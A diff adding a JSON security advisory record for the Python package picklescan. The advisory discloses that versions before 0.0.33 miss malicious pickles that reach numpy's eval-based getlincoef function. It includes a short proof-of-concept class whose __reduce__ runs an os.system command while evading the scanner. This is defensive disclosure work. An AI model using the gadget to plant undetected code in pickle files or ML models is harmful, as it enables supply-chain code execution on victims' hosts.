@@ -1,0 +1,55 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2025-12-29T15:28:01Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "picklescan"
+  },
+  "Advisory": {
+    "DatabaseId": 328843,
+    "Id": "GSA_kwCzR0hTQS1yOGc1LWNnZjItNG00bc4ABQSL",
+    "GhsaId": "GHSA-r8g5-cgf2-4m4m",
+    "References": [
+      {
+        "Url": "https://github.com/mmaitre314/picklescan/security/advisories/GHSA-r8g5-cgf2-4m4m"
+      },
+      {
+        "Url": "https://github.com/mmaitre314/picklescan/pull/53"
+      },
+      {
+        "Url": "https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab"
+      },
+      {
+        "Url": "https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-r8g5-cgf2-4m4m"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-r8g5-cgf2-4m4m"
+      }
+    ],
+    "Description": "### Summary\n\nAn unsafe deserialization vulnerability allows an attacker to execute arbitrary code on the host when loading a malicious pickle payload from an untrusted source.\n\n### Details\n\nThe `numpy.f2py.crackfortran` module exposes many functions that call `eval` on arbitrary strings of values. This is the case for `getlincoef` and `_eval_length`. This list is probably not exhaustive.\n\nAccording to https://numpy.org/doc/stable/reference/security.html#advice-for-using-numpy-on-untrusted-data, the whole `numpy.f2py` should be considered unsafe when loading a pickle.\n\n### PoC\n\n```python\nfrom numpy.f2py.crackfortran import getlincoef\n\nclass EvilClass:\n    def __reduce__(self):\n        payload = \"__import__('os').system('echo \\\"successful attack\\\"')\"\n        return getlincoef, (payload, [])\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on `picklescan` to detect malicious pickle files from untrusted sources.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Note\n\nThe problem was originally reported to the joblib project, but this was deemed unrelated to joblib itself. However, I checked that `picklescan` was indeed vulnerable.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-12-29T15:27:59Z",
+    "Severity": "HIGH",
+    "Summary": "Picklescan missing detection when calling numpy.f2py.crackfortran.getlincoef",
+    "UpdatedAt": "2025-12-29T15:28:01Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.0.33"
+      },
+      "VulnerableVersionRange": "\u003c 0.0.33"
+    }
+  ]
+}
